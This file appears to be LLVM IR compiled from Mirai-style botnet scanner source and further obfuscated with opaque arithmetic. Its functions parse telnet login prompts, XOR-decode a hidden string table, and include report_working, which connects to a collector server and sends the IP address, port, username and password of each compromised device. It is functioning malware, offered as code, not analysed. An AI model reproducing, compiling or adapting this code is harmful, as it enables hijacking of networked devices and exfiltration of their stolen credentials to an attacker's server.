  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 6
  %78 = load i32, i32* %77, align 4
  %79 = load i8*, i8** %7, align 8
  %80 = load i32, i32* %9, align 4
  %81 = add i32 %80, 155620422
  %82 = sub i32 %81, 1
  %83 = sub i32 %82, 155620422
  %84 = sub nsw i32 %80, 1
  %85 = call i32 @util_memsearch(i8* %75, i32 %78, i8* %79, i32 %83)
  %86 = icmp ne i32 %85, -1
  %87 = zext i1 %86 to i32
  store i32 %87, i32* %8, align 4
  br i1 %86, label %88, label %90

; <label>:88:                                     ; preds = %71
  %89 = load i32, i32* %8, align 4
  store i32 %89, i32* %6, align 4
  br label %90

; <label>:90:                                     ; preds = %88, %71
  br label %91

; <label>:91:                                     ; preds = %90, %68
  call void @table_lock_val(i8 zeroext 25)
  %92 = load i32, i32* %6, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %91
  store i32 0, i32* %2, align 4
  br label %97

; <label>:95:                                     ; preds = %91
  %96 = load i32, i32* %6, align 4
  store i32 %96, i32* %2, align 4
  br label %97

; <label>:97:                                     ; preds = %95, %94
  %98 = load i32, i32* %2, align 4
  ret i32 %98
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = sub i32 %9, -1608827625
  %11 = sub i32 %10, 1
  %12 = add i32 %11, -1608827625
  %13 = sub nsw i32 %9, 1
  store i32 %12, i32* %5, align 4
  br label %14

; <label>:14:                                     ; preds = %70, %1
  %15 = load i32, i32* %5, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %17, label %75

; <label>:17:                                     ; preds = %14
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 7
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %19, i64 0, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 58
  br i1 %25, label %62, label %26

; <label>:26:                                     ; preds = %17
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 7
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 62
  br i1 %34, label %62, label %35

; <label>:35:                                     ; preds = %26
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 36
  br i1 %43, label %62, label %44

; <label>:44:                                     ; preds = %35
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 7
  %47 = load i32, i32* %5, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [256 x i8], [256 x i8]* %46, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = sext i8 %50 to i32
  %52 = icmp eq i32 %51, 35
  br i1 %52, label %62, label %53

; <label>:53:                                     ; preds = %44
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 7
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %55, i64 0, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 37
  br i1 %61, label %62, label %69

; <label>:62:                                     ; preds = %53, %44, %35, %26, %17
  %63 = load i32, i32* %5, align 4
  %64 = sub i32 0, %63
  %65 = sub i32 0, 1
  %66 = add i32 %64, %65
  %67 = sub i32 0, %66
  %68 = add nsw i32 %63, 1
  store i32 %67, i32* %6, align 4
  br label %75

; <label>:69:                                     ; preds = %53
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %5, align 4
  %72 = sub i32 0, -1
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, -1
  store i32 %73, i32* %5, align 4
  br label %14

; <label>:75:                                     ; preds = %62, %14
  %76 = load i32, i32* %6, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %75
  store i32 0, i32* %2, align 4
  br label %81

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* %6, align 4
  store i32 %80, i32* %2, align 4
  br label %81

; <label>:81:                                     ; preds = %79, %78
  %82 = load i32, i32* %2, align 4
  ret i32 %82
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub i32 0, 1
  %17 = add i32 %15, %16
  %18 = sub nsw i32 %15, 1
  %19 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %17)
  %20 = icmp ne i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %42

; <label>:22:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %23 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %23, i8** %4, align 8
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 6
  %29 = load i32, i32* %28, align 4
  %30 = load i8*, i8** %4, align 8
  %31 = load i32, i32* %6, align 4
  %32 = add i32 %31, 2114946633
  %33 = sub i32 %32, 1
  %34 = sub i32 %33, 2114946633
  %35 = sub nsw i32 %31, 1
  %36 = call i32 @util_memsearch(i8* %26, i32 %29, i8* %30, i32 %34)
  store i32 %36, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %37 = load i32, i32* %5, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %22
  store i32 0, i32* %2, align 4
  br label %42

; <label>:40:                                     ; preds = %22
  %41 = load i32, i32* %5, align 4
  store i32 %41, i32* %2, align 4
  br label %42

; <label>:42:                                     ; preds = %40, %39, %21
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  br label %79

; <label>:19:                                     ; preds = %15
  %20 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  br label %23

; <label>:23:                                     ; preds = %22, %19
  call void @table_unlock_val(i8 zeroext 2)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i32 0, i32 0)) #6
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = call i8* @table_retrieve_val(i32 2, i32* null)
  %29 = bitcast i8* %28 to i16*
  %30 = load i16, i16* %29, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  call void @table_lock_val(i8 zeroext 2)
  %32 = load i32, i32* %9, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %23
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @close(i32 %40)
  br label %42

; <label>:42:                                     ; preds = %39, %23
  store i8 0, i8* %11, align 1
  %43 = load i32, i32* %9, align 4
  %44 = call i64 @send(i32 %43, i8* %11, i64 1, i32 16384)
  %45 = load i32, i32* %9, align 4
  %46 = bitcast i32* %4 to i8*
  %47 = call i64 @send(i32 %45, i8* %46, i64 4, i32 16384)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast i16* %5 to i8*
  %50 = call i64 @send(i32 %48, i8* %49, i64 2, i32 16384)
  %51 = load i32, i32* %9, align 4
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 4
  %54 = call i64 @send(i32 %51, i8* %53, i64 1, i32 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %59, i32 0, i32 4
  %61 = load i8, i8* %60, align 4
  %62 = zext i8 %61 to i64
  %63 = call i64 @send(i32 %55, i8* %58, i64 %62, i32 16384)
  %64 = load i32, i32* %9, align 4
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %66 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %65, i32 0, i32 5
  %67 = call i64 @send(i32 %64, i8* %66, i64 1, i32 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 1
  %71 = load i8*, i8** %70, align 8
  %72 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i64
  %76 = call i64 @send(i32 %68, i8* %71, i64 %75, i32 16384)
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %42, %18
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #4

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add nsw i32 %11, 1
  %17 = sext i32 %15 to i64
  %18 = call noalias i8* @malloc(i64 %17) #6
  store i8* %18, i8** %6, align 8
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %3, align 8
  %21 = load i32*, i32** %4, align 8
  %22 = load i32, i32* %21, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  call void @util_memcpy(i8* %19, i8* %20, i32 %26)
  store i32 0, i32* %5, align 4
  br label %28

; <label>:28:                                     ; preds = %91, %2
  %29 = load i32, i32* %5, align 4
  %30 = load i32*, i32** %4, align 8
  %31 = load i32, i32* %30, align 4
  %32 = icmp slt i32 %29, %31
  br i1 %32, label %33, label %97

; <label>:33:                                     ; preds = %28
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = xor i32 %39, -1
  %41 = and i32 222, %40
  %42 = xor i32 222, -1
  %43 = and i32 %39, %42
  %44 = or i32 %41, %43
  %45 = xor i32 %39, 222
  %46 = trunc i32 %44 to i8
  store i8 %46, i8* %37, align 1
  %47 = load i8*, i8** %6, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = xor i32 %52, -1
  %54 = and i32 237, %53
  %55 = xor i32 237, -1
  %56 = and i32 %52, %55
  %57 = or i32 %54, %56
  %58 = xor i32 %52, 237
  %59 = trunc i32 %57 to i8
  store i8 %59, i8* %50, align 1
  %60 = load i8*, i8** %6, align 8
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = xor i32 %65, -1
  %67 = and i32 -1320555439, %66
  %68 = xor i32 -1320555439, -1
  %69 = and i32 %65, %68
  %70 = xor i32 251, -1
  %71 = and i32 %70, -1320555439
  %72 = and i32 251, %68
  %73 = or i32 %67, %69
  %74 = or i32 %71, %72
  %75 = xor i32 %73, %74
  %76 = xor i32 %65, 251
  %77 = trunc i32 %75 to i8
  store i8 %77, i8* %63, align 1
  %78 = load i8*, i8** %6, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = sext i8 %82 to i32
  %84 = xor i32 %83, -1
  %85 = and i32 175, %84
  %86 = xor i32 175, -1
  %87 = and i32 %83, %86
  %88 = or i32 %85, %87
  %89 = xor i32 %83, 175
  %90 = trunc i32 %88 to i8
  store i8 %90, i8* %81, align 1
  br label %91

; <label>:91:                                     ; preds = %33
  %92 = load i32, i32* %5, align 4
  %93 = add i32 %92, 649329497
  %94 = add i32 %93, 1
  %95 = sub i32 %94, 649329497
  %96 = add nsw i32 %92, 1
  store i32 %95, i32* %5, align 4
  br label %28

; <label>:97:                                     ; preds = %28
  %98 = load i8*, i8** %6, align 8
  ret i8* %98
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 255, -1
  %14 = xor i32 %12, %13
  %15 = and i32 %14, %12
  %16 = and i32 %12, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %5, align 1
  %18 = load i32, i32* @table_key, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 255, -1
  %21 = xor i32 %19, %20
  %22 = and i32 %21, %19
  %23 = and i32 %19, 255
  %24 = trunc i32 %22 to i8
  store i8 %24, i8* %6, align 1
  %25 = load i32, i32* @table_key, align 4
  %26 = lshr i32 %25, 16
  %27 = xor i32 255, -1
  %28 = xor i32 %26, %27
  %29 = and i32 %28, %26
  %30 = and i32 %26, 255
  %31 = trunc i32 %29 to i8
  store i8 %31, i8* %7, align 1
  %32 = load i32, i32* @table_key, align 4
  %33 = lshr i32 %32, 24
  %34 = xor i32 %33, -1
  %35 = xor i32 255, -1
  %36 = xor i32 204310219, -1
  %37 = or i32 %34, %35
  %38 = or i32 204310219, %36
  %39 = xor i32 %37, -1
  %40 = and i32 %39, %38
  %41 = and i32 %33, 255
  %42 = trunc i32 %40 to i8
  store i8 %42, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %119, %1
  %44 = load i32, i32* %3, align 4
  %45 = load %struct.table_value*, %struct.table_value** %4, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 1
  %47 = load i16, i16* %46, align 8
  %48 = zext i16 %47 to i32
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %126

; <label>:50:                                     ; preds = %43
  %51 = load i8, i8* %5, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, -1
  %62 = and i32 %52, %61
  %63 = xor i32 %52, -1
  %64 = and i32 %60, %63
  %65 = or i32 %62, %64
  %66 = xor i32 %60, %52
  %67 = trunc i32 %65 to i8
  store i8 %67, i8* %58, align 1
  %68 = load i8, i8* %6, align 1
  %69 = zext i8 %68 to i32
  %70 = load %struct.table_value*, %struct.table_value** %4, align 8
  %71 = getelementptr inbounds %struct.table_value, %struct.table_value* %70, i32 0, i32 0
  %72 = load i8*, i8** %71, align 8
  %73 = load i32, i32* %3, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %72, i64 %74
  %76 = load i8, i8* %75, align 1
  %77 = sext i8 %76 to i32
  %78 = xor i32 %77, -1
  %79 = and i32 %69, %78
  %80 = xor i32 %69, -1
  %81 = and i32 %77, %80
  %82 = or i32 %79, %81
  %83 = xor i32 %77, %69
  %84 = trunc i32 %82 to i8
  store i8 %84, i8* %75, align 1
  %85 = load i8, i8* %7, align 1
  %86 = zext i8 %85 to i32
  %87 = load %struct.table_value*, %struct.table_value** %4, align 8
  %88 = getelementptr inbounds %struct.table_value, %struct.table_value* %87, i32 0, i32 0
  %89 = load i8*, i8** %88, align 8
  %90 = load i32, i32* %3, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8, i8* %89, i64 %91
  %93 = load i8, i8* %92, align 1
  %94 = sext i8 %93 to i32
  %95 = xor i32 %94, -1
  %96 = and i32 %86, %95
  %97 = xor i32 %86, -1
  %98 = and i32 %94, %97
  %99 = or i32 %96, %98
  %100 = xor i32 %94, %86
  %101 = trunc i32 %99 to i8
  store i8 %101, i8* %92, align 1
  %102 = load i8, i8* %8, align 1
  %103 = zext i8 %102 to i32
  %104 = load %struct.table_value*, %struct.table_value** %4, align 8
  %105 = getelementptr inbounds %struct.table_value, %struct.table_value* %104, i32 0, i32 0
  %106 = load i8*, i8** %105, align 8
  %107 = load i32, i32* %3, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = sext i8 %110 to i32
  %112 = xor i32 %111, -1
  %113 = and i32 %103, %112
  %114 = xor i32 %103, -1
  %115 = and i32 %111, %114
  %116 = or i32 %113, %115
  %117 = xor i32 %111, %103
  %118 = trunc i32 %116 to i8
  store i8 %118, i8* %109, align 1
  br label %119

; <label>:119:                                    ; preds = %50
  %120 = load i32, i32* %3, align 4
  %121 = sub i32 0, %120
  %122 = sub i32 0, 1
  %123 = add i32 %121, %122
  %124 = sub i32 0, %123
  %125 = add nsw i32 %120, 1
  store i32 %124, i32* %3, align 4
  br label %43

; <label>:126:                                    ; preds = %43
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  store i32 %13, i32* %3, align 4
  br label %4

; <label>:15:                                     ; preds = %4
  %16 = load i32, i32* %3, align 4
  ret i32 %16
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %17, %3
  %12 = load i32, i32* %6, align 4
  %13 = sub i32 0, -1
  %14 = sub i32 %12, %13
  %15 = add nsw i32 %12, -1
  store i32 %14, i32* %6, align 4
  %16 = icmp ne i32 %12, 0
  br i1 %16, label %17, label %23

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %8, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %8, align 8
  %20 = load i8, i8* %18, align 1
  %21 = load i8*, i8** %7, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %7, align 8
  store i8 %20, i8* %21, align 1
  br label %11

; <label>:23:                                     ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %14, %2
  %8 = load i32, i32* %4, align 4
  %9 = sub i32 %8, 1743592906
  %10 = add i32 %9, -1
  %11 = add i32 %10, 1743592906
  %12 = add nsw i32 %8, -1
  store i32 %11, i32* %4, align 4
  %13 = icmp ne i32 %8, 0
  br i1 %13, label %14, label %17

; <label>:14:                                     ; preds = %7
  %15 = load i8*, i8** %5, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
